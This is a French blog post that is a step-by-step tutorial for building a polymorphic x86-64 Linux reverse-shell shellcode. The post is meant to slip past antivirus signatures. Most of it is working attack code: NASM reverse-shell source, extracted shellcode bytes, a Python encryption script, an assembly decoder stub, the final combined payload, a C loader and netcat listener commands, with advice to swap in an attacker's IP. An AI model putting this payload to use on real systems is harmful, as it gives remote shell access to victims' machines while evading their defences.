---
weight: 4
title: "Shellcode Polymorphique"
date: 2020-07-01T00:00:00+00:00
draft: false
author: "Nyxott"
description: "Créer un shellcode polymorphique"
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["Projects"]
categories: ["Projects"]

lightgallery: true
---

Cet article explique comment créer un shellcode polymorphique permettant d'obtenir un reverse shell.

<!--more-->

## Définitions et explications

Un shellcode est une suite de caractères hexadécimaux représentant un binaire.

Voici par exemple un shellcode permettant d'effectuer la commande `execve("/bin/sh");` sur un Linux 64 bits :
```shell
\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
```

Ce shellcode a été tiré du site [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/) où se trouve de nombreux shellcodes pour tous types d'architectures.

Un shellcode peut être utilisé durant l'exploitation d'un buffer overflow.

Dans un programme écrit en C, par exemple, des buffers peuvent être utilisés afin de stocker en RAM des informations de manière temporaire. Si les entrées utilisateur à destination de ces buffers ne sont pas correctement gérées et/ou que des fonctions obsolètes sont utilisées, alors il est possible de remplir le buffer puis d'en sortir pour écrire sur la RAM. C'est un buffer overflow.

Pour reprendre l'exemple du shellcode ci-dessus, il serait possible d'effectuer un buffer overflow et d'utiliser ce shellcode pour obtenir un shell sur le serveur.

Néanmoins, les antivirus détectent certains patterns tels que, par exemple, la chaîne de caractères `/bin/sh` représenté en hexadécimale par `\x2f\x62\x69\x6e\x2f\x73\x68`. En effet, l'on peut remarquer que ce pattern est bien présent dans le shellcode ci-dessus. Ainsi, les antivirus peuvent empêcher son exécution et par conséquent le succès de l'exploitation d'un buffer overflow.

C'est pourquoi des shellcodes dit polymorphiques ont vu le jour.

Le terme polymorphique indique simplement que le shellcode sera chiffré et qu'un décodeur y sera ajouté.

Pour illustrer cela de manière extrêmement simple, nous allons reprendre le shellcode du début :
```shell
\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
```

Nous le chiffrons en incrémentant chaque valeur hexadécimale :
```shell
\x49\x32\xd3\x49\xbc\x30\x30\x63\x6a\x6f\x30\x74\x69\x49\xc2\xec\x09\x54\x49\x8a\xe8\x51\x58\x49\x8a\xe7\xb1\x3c\x10\x06
```

Notre shellcode est désormais chiffré puisque nous avons ajouté 0x01 à chaque valeur hexadécimale. Nous pouvons alors remarquer que le pattern `\x2f\x62\x69\x6e\x2f\x73\x68` n'est plus présent.

{{< admonition warning >}}
Il est important de préciser ici que certaines valeurs hexadécimales sont à proscrire. Ce sont les badchars. Ils peuvent varier, mais la plupart du temps ce sont `\x00` et `\x0a` qui doivent être évités puisque le premier représente un null byte (indiquant une fin de chaîne de caractères) et le second un saut de ligne. Ils créent des comportements inattendu et empêche la bonne exécution du shellcode. Il faut donc veiller à ce que ces valeurs ne soient présentes nulle part.
{{< /admonition >}}

Notre shellcode étant désormais chiffré, il n'est plus exécutable et il est donc nécessaire d'y ajouter un décodeur.

Ici, c'est un exemple donc je ne vais pas montrer le shellcode permettant de décoder ce shellcode chiffré, mais le shellcode final aura la forme suivante :
```shell
<shellcodeDecodeur>\x49\x32\xd3\x49\xbc\x30\x30\x63\x6a\x6f\x30\x74\x69\x49\xc2\xec\x09\x54\x49\x8a\xe8\x51\x58\x49\x8a\xe7\xb1\x3c\x10\x06
```

Le shellcode final sera donc constitué d'un shellcode décodeur suivi du shellcode chiffré. Ainsi, les antivirus ne pourront pas détecter de pattern spécifique avant l'exécution de ce shellcode et lors de son exécution, ce dernier se déchiffrera automatiquement puis s'exécutera.

## Notions d'assembleur

{{< admonition tip >}}
Quelques notions d'assembleur sont indéniablement nécessaires afin de faciliter la compréhension de la suite de ce post. Je vous invite donc à lire mon post [L'assembleur](https://nyxott.github.io/posts/asm) avant de continuer celui-ci.
{{< /admonition >}}

## Projet

Nous allons donc voir comment faire un shellcode polymorphique.

### Reverse shell

Tout d'abord, il nous faut un shellcode initial. Un reverse shell est un bon choix puisque cela signifie que nous aurons un accès shell à la machine distante depuis notre machine.

Voici donc le code assembleur de notre reverse shell :
```nasm
section .text
    global _start

_start:

    initStructure:
        push 0x640a017f             ;put on the stack "127.1.10.100" in little endian
        push word 0x697a            ;put on the stack "31337" in little endian
        push word 0x02              ;put on the stack the communication area (here "AF_INET")

    socket:
        xor rdx, rdx                ;indicate the protocol to be used (here the default protocol)
        xor rsi, rsi                ;set to 0 the register used to store the semantics
        mov sil, 0x01               ;indicate the semantics to be used (here "SOCK_STREAM")
        xor rdi, rdi                ;set to 0 the register used to store the communication area
        mov dil, 0x02               ;indicate the communication area (here "AF_INET")
        xor rax, rax                ;set to 0 the register used to store the number syscall
        mov al, 0x29                ;indicate the number for the socket syscall (41)
        syscall

    connect:
        xor rdx, rdx                ;set to 0 the register used to store the size of the target host address
        mov dl, 0x11                ;indicate the size of the target host address (here 127.1.10.100:31337 = 18 - 1 = 17)
        lea rsi, [rsp]              ;indicate the target address (here "127.1.10.100:31337") 
        mov rdi, rax                ;indicate the previously created socket
        xor rax, rax                ;set to 0 the register used to store the number syscall
        mov al, 0x2a                ;indicate the number for the connect syscall (42)
        syscall

    redirection:
        xor rsi, rsi                ;set to 0 the register used to store the file descriptor
        mov al, 0x21                ;indicate the number for the dup2 syscall
        syscall
        inc sil                     ;increment by 1 the register used to store the file descriptor
        mov al, 0x21                ;indicate the number for the dup2 syscall
        syscall
        inc sil                     ;increment by 1 the register used to store the file descriptor
        mov al, 0x21                ;indicate the number for the dup2 syscall
        syscall

    execShell:
        mov rdi, 0x68732f6e69622f2f ;"//bin/sh" in little endian
        xor rsi, rsi                ;indicate the arguments (here there are no arguments)
        push rsi                    ;put on the stack null byte
        push rdi                    ;put on the stack "//bin/sh"
        xor rdx, rdx                ;indicate the environment (here there is no environment)
        lea rdi, [rsp]              ;indicate the path (here "//bin/sh")
        xor rax, rax                ;set to 0 the register use to store the syscall number
        mov al, 0x3b                ;indicate the number for the execve syscall
        syscall
```

Dans un premier temps nous définissons la fonction `initStructure` qui va mettre sur la stack l'adresse IP de la cible, son port ainsi que la famille à utiliser (ici IP).

Viens ensuite la fonction `socket` qui crée un socket sur notre machine.

Ce bout de code est équivalent au code C suivant :
```c
socket(AF_INET, SOCK_STREAM, 0);
```

Puis, viens la fonction `connect` qui va donc connecter notre socket à la machine cible via les informations misent sur la stack auparavant.

Ce bout de code est équivalent au code C suivant :
```c
// socketDescriptor contient le file descriptor du socket créé précédemment (résultat retourner par la fonction "socket")
// serv_addr corresponds à la structure contenant l'IP et le port de la cible
connect(socketDescriptor, (struct sockaddr *) &serv_addr, 17)
```

La fonction `redirection` permet de rediriger les flux de notre socket vers `stdin`, `stdout` et `stderr`.

Ce bout de code est équivalent au code C suivant :
```c
// socketDescriptor contient le file descriptor du socket créé précédemment (résultat retourner par la fonction "socket")
dup2(socketDescriptor, 0); // O corresponds à l'entrée standard "stdin"
dup2(socketDescriptor, 1); // 1 corresponds à la sortie standard "stdout"
dup2(socketDescriptor, 2); // 2 corresponds à la sortie d'erreur standard "stderr"
```

Enfin, la fonction `execShell` exécute un shell qui sera lancé sur notre cible via le socket.

Ce bout de code est équivalent au code C suivant :
```c
execve("//bin/sh", 0, 0);
```

Nous pouvons ensuite compiler notre code :
```shell
nasm -f elf64 reverseShell.asm
ld reverseShell.o -o reverseShell
```

Nous devons ouvrir un port sur notre machine à l'adresse que nous avons indiquée dans notre programme :
```shell
nc -l 127.1.10.100 31337 -v
```

Puis, nous exécutons notre programme :
```shell
./reverseShell
```

Nous obtenons alors une connexion entrante sur notre port et nous pouvons exécuter les mêmes commandes que dans un shell.

Maintenant que nous avons vérifié que notre programme fonctionne correctement nous pouvons récupérer le shellcode correspondant :
```shell
objcopy --remove-section .note.gnu.property reverseShell (cette commande supprime une section du programme qui ne nous est pas utile et qui génère des badchars)
for i in `objdump -D reverseShell | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done ; echo
```

Le résultat nous indique :
```shell
\x68\x7f\x01\x0a\x64\x66\x68\x7a\x69\x66\x6a\x02\x48\x31\xd2\x48\x31\xf6\x40\xb6\x01\x48\x31\xff\x40\xb7\x02\x48\x31\xc0\xb0\x29\x0f\x05\x48\x31\xd2\xb2\x11\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x31\xd2\x48\x8d\x3c\x24\x48\x31\xc0\xb0\x3b\x0f\x05
```

Si le résultat vous indique :
```shell
h
dfhzifjH1�H1�@�H1�@�H1��)H1ҲH�4$H��H1��*H1��!@�ư!@�ư!H�//bin/shH1�VWH1�H�<$H1��;
```

C'est que votre shell interprète l'hexadécimal. Cela peut arriver si votre shell est `zsh` par exemple.

Dans ce cas ouvrez un shell bash puis ré-exécuté la commande :
```shell
/bin/bash
for i in `objdump -D reverseShell | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done ; echo
```

Nous pouvons voir que notre shellcode ne contient aucun badchar. En réalité, il en contient un qui est `\x0a`. Cependant, cela correspond au `10` de notre adresse IP et cela ne posera donc aucun problème.

{{< admonition >}}
Ici, l'adresse IP `127.1.10.100` est utilisée pour l'exemple. Bien sûr, cela n'a aucun intérêt puisque nous ouvrons un shell sur notre machine depuis notre machine. Néanmoins, il suffit de remplacer l'IP par l'adresse de notre machine d'attaque ainsi que de modifier la longueur totale du socket (troisième argument de la fonction `connect`), si cela est nécessaire. En effet, ce shellcode sera exécuté sur la machine cible, lors de l'exécution du buffer overflow, qui se connectera alors à notre machine d'attaque. Ainsi, nous aurons une connexion entrante sur le port de notre machine d'attaque qui nous permettra d'effectuer des commandes sur la machine cible.
{{< /admonition >}}

### Chiffrement du shellcode

Ensuite, nous devons chiffrer notre shellcode. Pour cela, un script Python, par exemple, serait utile afin de ne pas avoir à le faire à la main.

Voici donc le code Python qui nous permettra de chiffrer facilement notre shellcode :
```python
#!/usr/bin/env python3
#encoding: UTF-8

import sys
import argparse

verificator = 0
encryptedShellcode = []

# Bit shift operation to the left
rol = lambda aValue, aBitShift, aMaxBits=8: (aValue << aBitShift % aMaxBits) & (2 ** aMaxBits - 1) | ((aValue & (2 ** aMaxBits - 1)) >> (aMaxBits - (aBitShift % aMaxBits))) 

# Statement of program arguments
parser = argparse.ArgumentParser()
parser.add_argument("--shellcode", help="The shellcode", required=True)
parser.add_argument("--XOR", help="The XOR key", type=int, required=True)
parser.add_argument("--cesarKey1", help="The first cesar key", type=int, required=True)
parser.add_argument("--cesarKey2", help="The second cesar key", type=int, required=True)
parser.add_argument("--ROL1", help="The first bit shift key", type=int, required=True)
parser.add_argument("--ROL2", help="The second bit shift key", type=int, required=True)
args = parser.parse_args()

shellcodeSplitted = args.shellcode.split("x")[1:]

# Browsing of the shellcode
for i in range(len(shellcodeSplitted)):
    verificator = verificator + 1

    if verificator == 1:
        encryptedShellcode.append(hex((int(shellcodeSplitted[i], 16) + args.cesarKey1) % 0x100)) # Cesar cipher with first key
    elif verificator == 2:
        encryptedShellcode.append((hex(int(shellcodeSplitted[i], 16) ^ args.XOR))) # XOR with key
    else:
        encryptedShellcode.append(hex((int(shellcodeSplitted[i], 16) - args.cesarKey2) % 0x100)) # Cesar cipher with second key
        verificator = 0

# Browsing of the shellcode
for i in range(len(encryptedShellcode)):
    if i % 2 == 0:
        encryptedShellcode[i] = hex(rol(int(encryptedShellcode[i], 16), args.ROL1)) # Bit shift operation to the left with first key
    else:
        encryptedShellcode[i] = hex(rol(int(encryptedShellcode[i], 16), args.ROL2)) # Bit shift operation to the left with second key

# Shellcode reconstruction and badchars detection
for i in range(len(encryptedShellcode)):
    if len(encryptedShellcode[i]) == 3:
        encryptedShellcode[i] = "\\x0" + encryptedShellcode[i][-1]
    else:
        encryptedShellcode[i] = "\\x" + encryptedShellcode[i][-2::]

    if encryptedShellcode[i] in ["\\x00", "\\x0a"]:
        print("\n" + "Error : Badchar detected", file=sys.stderr)
        sys.exit(1)

print("\n" + "The encrypted shellcode : {anEncryptedShellcode}".format(anEncryptedShellcode="".join(encryptedShellcode)))
```

Ce code permet de prendre plusieurs arguments en entrée dont le shellcode à chiffrer et les différentes clefs à utiliser.

Il va parcourir le shellcode deux fois de suite afin d'y appliquer plusieurs chiffrements de manière mélangée et superposée. 

Lors du premier parcours, un chiffrement cesar+ sera appliqué sur le premier caractère, suivi d'un XOR sur le second et d'un chiffrement cesar- sur le troisième. Ce cycle est répété jusqu'à la fin du shellcode.

Lors du second parcours, un décalage de bit vers la gauche est effectué sur le premier caractère puis un second est de nouveau effectué sur le deuxième caractère avec une clef différente. Ce cycle est répété jusqu'à la fin du shellcode.

Enfin, une détection des badchars est effectuée afin de s'assurer que notre shellcode chiffré n'en contiennent pas.

Nous pouvons rendre ce programme exécutable :
```shell
chmod +x cipherShellcode.py
```

Puis, nous pouvons l'exécuter via la commande suivante :
```shell
./cipherShellcode.py --shellcode \x68\x7f\x01\x0a\x64\x66\x68\x7a\x69\x66\x6a\x02\x48\x31\xd2\x48\x31\xf6\x40\xb6\x01\x48\x31\xff\x40\xb7\x02\x48\x31\xc0\xb0\x29\x0f\x05\x48\x31\xd2\xb2\x11\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x31\xd2\x48\x8d\x3c\x24\x48\x31\xc0\xb0\x3b\x0f\x05 --cesarKey1 13 --XOR 7 --cesarKey2 18 --ROL1 3 --ROL2 5
```

Le résultat nous indique :
```shell
The encrypted shellcode : \xab\x0f\x7f\xe2\x1b\x8a\xab\xaf\xba\x6e\x6b\x1e\xaa\xc6\x06\xaa\xb1\x9c\x6a\x36\x7f\xaa\xb1\xbd\x6a\x16\x87\xaa\xb1\xd5\xed\xc5\xef\x42\x7a\xe3\xfe\xb6\xff\xaa\x54\x44\x89\xe9\xbb\x9a\x7a\xe3\x6e\xf6\xc0\x83\x10\xc6\xf1\x3e\xf4\xc5\x40\x7e\x6a\x3f\xa5\xb7\x31\xbf\x90\xe8\x67\x7a\xbd\xe1\xe0\x40\xb1\x99\x41\xa3\x7b\xcd\xe2\x87\xa3\xca\xaa\xc6\x27\x6c\x82\xc6\xf1\xba\xb1\x53\xd9\x42\xaa\xc6\x75\xb7\xe1\xbf\x90
```

Nous avons désormais notre shellcode chiffré.

{{< admonition >}}
Vous pouvez changer les clefs comme vous le désirez et utiliser également un autre shellcode. Si un badchar est détecté, cela sera indiqué et il suffira de modifier une ou plusieurs clefs jusqu'à avoir une combinaison fonctionnelle.
{{< /admonition >}}

### Déchiffrement du shellcode

Nous devons désormais déchiffrer notre shellcode. Pour cela, nous allons coder un programme en assembleur qui va inverser le processus de chiffrement de notre code Python.

Voici le code assembleur permettant de déchiffrer notre shellcode :
```nasm
section .text:
    global _start

_start:
  
    jmp short uselessButEssential  ;jump to uselessButEssential

    init:
        pop rsi                    ;get the shellcode address
        xor rbx, rbx               ;set to 0 the register we use as index
        xor rcx, rcx               ;set to 0 the register we use as counter
        xor rdx, rdx               ;set to 0 the register we use as a counter to know which decryption function to jump to
        mov cl, 0x66               ;tell our counter the size of our encrypted shellcode - 1 (here 102)

    router1:
        inc dl                     ;increment by 1 the counter to know which decryption function to jump to
        cmp dl, 2                  ;test if our counter equals 2
        je decipherROR2            ;if yes we jump to decipherROR2

    decipherROR1:
        ror byte [rsi + rbx], 0x03 ;do a bitshift to the right to decipher the first bitshift (here 3)
        jmp short manager1         ;jump to manager1

    decipherROR2:
        ror byte [rsi + rbx], 0x05 ;do a bitshift to the right to decipher the first bitshift (here 5)
        xor rdx, rdx               ;set to 0 the register we use as a counter to know which decryption function to jump to

    manager1:
        add bl, 1                  ;increment by 1 the index
        sub cl, 1                  ;increment by 1 the counter
        jno router1                ;if our counter doesn't have overflow it means we're not at the end of the chain so we jump to router1

    reset:
        xor rbx, rbx               ;set to 0 the register we use as index
        xor rcx, rcx               ;set to 0 the register we use as counter
        xor rdx, rdx               ;set to 0 the register we use as a counter to know which decryption function to jump to
        mov cl, 0x66               ;tell our counter the size of our encrypted shellcode - 1 (here 102)

    router2:
        inc dl                     ;increment by 1 the register we use as a counter to know which decryption function to jump to
        cmp dl, 2                  ;test if our counter equals 2
        je decipherXOR             ;if yes we jump to decipherXOR
        cmp dl, 3                  ;else we test if out counter equals 3
        je decipherCesarMinus      ;if yes we jump to decipherCesarMinus

    decipherCesarPlus:
        sub byte [rsi + rbx], 0x0d ;decrease the value of the current byte to decipher the first cesar (here 13)
        jmp short manager2         ;jump to manager2

    decipherXOR:
        xor byte [rsi + rbx], 0x07 ;we XOR the current byte to decipher the XOR (here 7)
        jmp short manager2         ;jump to manager2

    decipherCesarMinus:
        add byte [rsi + rbx], 0x12 ;we increase the value of the current byte to decipher the second cesar (here 18)
        xor rdx, rdx               ;increment by 1 the register we use as a counter to know which decryption function to jump to

    manager2:
        add bl, 1                  ;increment by 1 the index
        sub cl, 1                  ;increment by 1 the counter
        jno router2                ;if our counter doesn't have overflow it means we're not at the end of the chain so we jump to router1
        jmp rsi                    ;else we jump to our decrypted shellcode

    uselessButEssential:
        call init                  ;call init
```

Tout d'abord, nous sautons à la fonction `uselessButEssential` dans laquelle l'on appelle la fonction `init`. Cette technique peut s'avérer quelque peu incompréhensible. Souvenez-vous de la forme finale de notre shellcode. Nous avons d'abord le décodeur suivi du shellcode chiffré. En faisant ce saut à cette fonction (qui doit être placé tout à la fin du code) le registre `rip` va contenir l'adresse de la prochaine instruction à exécuter qui n'est autre que le début de notre shellcode chiffré. L'instruction `call` va effectuer un `push rip` ce qui mettra sur la stack l'adresse du début de notre shellcode chiffré avant de sauter vers la fonction `init`.

La fonction `init` nous permet d'initialiser quelques variables et de récupérer l'adresse du shellcode chiffré qui a été mise sur la stack précédemment. 

Viens ensuite la fonction `router1`. Souvenez-vous, nous avions chiffré un caractère sur deux avec un ROL et une clef, puis, l'autre caractère toujours avec un ROL, mais avec une clef différente. Cette fonction va donc se charger de détecter si l'on est sur le premier ou le second caractère afin de diriger le programme vers la bonne fonction de déchiffrement.

Les fonctions `decipherROR1` et `decipherROR2` vont se charger d'effectuer un ROR avec la clef correspondante.

La fonction `manager1` va quant à elle se charger d'incrémenter nos compteurs et de détecter si l'on a atteint la fin de notre shellcode. Si tel est le cas le programme passera à la fonction `reset`, sinon, le programme retournera dans `router1` pour un nouveau tour.

La fonction `reset` ré-initialise toutes les variables à l'instar de la fonction `init`.

La fonction `router2` fonctionne comme `router1`. En effet, nous avions chiffré un caractère sur trois avec un cesar et une clef, le second caractère avait été chiffré avec un XOR et une clef différente et enfin le troisième caractère avait été chiffré avec un cesar allant dans le sens opposé du premier et encore avec une nouvelle clef. Cette fonction permet donc de détecter si l'on est sur le premier, deuxième ou troisième caractère et de diriger le programme vers la bonne fonction de déchiffrement.

Les fonctions `decipherCesarPlus` et `decipherCesarMinus` vont se charger d'effectuer le déchiffrement de cesar avec leurs clefs respectives.

De même, la fonction `decipherXOR` va se charger de déchiffrer le XOR avec la clef lui correspondant.

Enfin, arrive la fonction `manager2` qui, comme `manager1`, va se charger d'incrémenter nos compteurs et de détecter si l'on a atteint la fin de notre shellcode. Si tel est le cas le programme ira à l'adresse de notre shellcode décodé afin de l'exécuter, sinon, le programme retournera dans `router2` pour un nouveau tour.

{{< admonition warning >}}
Il est à noter que si l'on change les clefs dans le programme de chiffrement il faudra également changer les clefs dans ce programme.
{{< /admonition >}}

Nous pouvons compiler notre code :
```shell
nasm -f elf64 decipherShellcode.asm
ld decipherShellcode.o -o decipherShellcode
```

Contrairement au code assembleur de notre reverse shell, nous ne pourrons pas exécuter ce code. Ou plus précisément, nous pourrons, mais cela générera un segfault puisque nous n'avons pas notre shellcode chiffré sur la stack.

Nous pouvons donc directement récupérer le shellcode correspondant à notre programme :
```shell
for i in `objdump -D decipherShellcode | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done ; echo
```

Le résultat nous indique :
```shell
\xeb\x5c\x5e\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x06\xc0\x0c\x1e\x03\xeb\x07\xc0\x0c\x1e\x05\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xe4\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x0b\x80\xfa\x03\x74\x0c\x80\x2c\x1e\x0d\xeb\x0d\x80\x34\x1e\x07\xeb\x07\x80\x04\x1e\x12\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xd9\xff\xe6\xe8\x9f\xff\xff\xff
```

### Exécution du shellcode

Pour vérifier le bon fonctionnement du shellcode, nous allons utiliser un petit programme en C qui simulera son exécution.

Voici le code C en question :
```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

char shellcode[] = \
  "\xeb\x5c\x5e\x48\x31\xdb\x48\x31\xc9\x48"
  "\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74"
  "\x06\xc0\x0c\x1e\x03\xeb\x07\xc0\x0c\x1e"
  "\x05\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01"
  "\x71\xe4\x48\x31\xdb\x48\x31\xc9\x48\x31"
  "\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x0b"
  "\x80\xfa\x03\x74\x0c\x80\x2c\x1e\x0d\xeb"
  "\x0d\x80\x34\x1e\x07\xeb\x07\x80\x04\x1e"
  "\x12\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01"
  "\x71\xd9\xff\xe6\xe8\x9f\xff\xff\xff\xab"
  "\x0f\x7f\xe2\x1b\x8a\xab\xaf\xba\x6e\x6b"
  "\x1e\xaa\xc6\x06\xaa\xb1\x9c\x6a\x36\x7f"
  "\xaa\xb1\xbd\x6a\x16\x87\xaa\xb1\xd5\xed"
  "\xc5\xef\x42\x7a\xe3\xfe\xb6\xff\xaa\x54"
  "\x44\x89\xe9\xbb\x9a\x7a\xe3\x6e\xf6\xc0"
  "\x83\x10\xc6\xf1\x3e\xf4\xc5\x40\x7e\x6a"
  "\x3f\xa5\xb7\x31\xbf\x90\xe8\x67\x7a\xbd"
  "\xe1\xe0\x40\xb1\x99\x41\xa3\x7b\xcd\xe2"
  "\x87\xa3\xca\xaa\xc6\x27\x6c\x82\xc6\xf1"
  "\xba\xb1\x53\xd9\x42\xaa\xc6\x75\xb7\xe1"
  "\xbf\x90";

void main() {
    printf("Shellcode length : %u\n", strlen(shellcode));
    
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}
```

Comme vous pouvez le voir, le shellcode du décodeur a été concaténé devant le shellcode chiffré afin de former un unique shellcode final :
```shell
Shellcode du décodeur : \xeb\x5c\x5e\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x06\xc0\x0c\x1e\x03\xeb\x07\xc0\x0c\x1e\x05\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xe4\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x0b\x80\xfa\x03\x74\x0c\x80\x2c\x1e\x0d\xeb\x0d\x80\x34\x1e\x07\xeb\x07\x80\x04\x1e\x12\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xd9\xff\xe6\xe8\x9f\xff\xff\xff

Shellcode chiffré : \xab\x0f\x7f\xe2\x1b\x8a\xab\xaf\xba\x6e\x6b\x1e\xaa\xc6\x06\xaa\xb1\x9c\x6a\x36\x7f\xaa\xb1\xbd\x6a\x16\x87\xaa\xb1\xd5\xed\xc5\xef\x42\x7a\xe3\xfe\xb6\xff\xaa\x54\x44\x89\xe9\xbb\x9a\x7a\xe3\x6e\xf6\xc0\x83\x10\xc6\xf1\x3e\xf4\xc5\x40\x7e\x6a\x3f\xa5\xb7\x31\xbf\x90\xe8\x67\x7a\xbd\xe1\xe0\x40\xb1\x99\x41\xa3\x7b\xcd\xe2\x87\xa3\xca\xaa\xc6\x27\x6c\x82\xc6\xf1\xba\xb1\x53\xd9\x42\xaa\xc6\x75\xb7\xe1\xbf\x90

Shellcode final : \xeb\x5c\x5e\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x06\xc0\x0c\x1e\x03\xeb\x07\xc0\x0c\x1e\x05\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xe4\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x0b\x80\xfa\x03\x74\x0c\x80\x2c\x1e\x0d\xeb\x0d\x80\x34\x1e\x07\xeb\x07\x80\x04\x1e\x12\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xd9\xff\xe6\xe8\x9f\xff\xff\xff\xab\x0f\x7f\xe2\x1b\x8a\xab\xaf\xba\x6e\x6b\x1e\xaa\xc6\x06\xaa\xb1\x9c\x6a\x36\x7f\xaa\xb1\xbd\x6a\x16\x87\xaa\xb1\xd5\xed\xc5\xef\x42\x7a\xe3\xfe\xb6\xff\xaa\x54\x44\x89\xe9\xbb\x9a\x7a\xe3\x6e\xf6\xc0\x83\x10\xc6\xf1\x3e\xf4\xc5\x40\x7e\x6a\x3f\xa5\xb7\x31\xbf\x90\xe8\x67\x7a\xbd\xe1\xe0\x40\xb1\x99\x41\xa3\x7b\xcd\xe2\x87\xa3\xca\xaa\xc6\x27\x6c\x82\xc6\xf1\xba\xb1\x53\xd9\x42\xaa\xc6\x75\xb7\xe1\xbf\x90
```

Nous pouvons compiler notre code :
```shell
gcc -z execstack -fno-stack-protector -fno-pie -z norelro -fPIC testShellcode.c -o testShellcode
```

Les flags de compilations indiqués permettent de supprimer des protections. Cependant, je ne rentrerais pas dans ces détails ici puisque ce n'est pas l'objectif du post.

Nous devons ouvrir un port sur notre machine à l'adresse que nous avons indiquée dans notre programme :
```shell
nc -l 127.1.10.100 31337 -v
```

Puis, nous exécutons notre programme :
```shell
./testShellcode 
```

Nous obtenons alors une connexion entrante sur notre port et nous pouvons exécuter les mêmes commandes que dans un terminal.

Notre shellcode polymorphique est fonctionnel !

Vous pouvez retrouver la totalité du projet sur mon GitHub : [https://github.com/Nyxott/ShellcodePolymorphique](https://github.com/Nyxott/ShellcodePolymorphique).
